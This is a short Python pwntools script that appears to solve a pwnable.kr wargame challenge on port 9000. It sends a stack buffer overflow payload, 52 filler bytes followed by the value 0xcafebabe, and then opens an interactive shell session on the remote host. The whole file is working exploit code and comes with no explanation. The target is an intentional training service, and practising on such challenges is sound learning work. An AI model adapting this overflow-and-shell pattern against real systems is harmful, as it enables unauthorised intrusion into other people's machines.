
import os
import sys
from pwn import *
def dec():
    payload = '\x90'*52+'\xbe\xba\xfe\xca'
    p = remote('pwnable.kr', 9000)
    p.sendline(payload)
    p.interactive()
if __name__ == '__main__':
    dec()
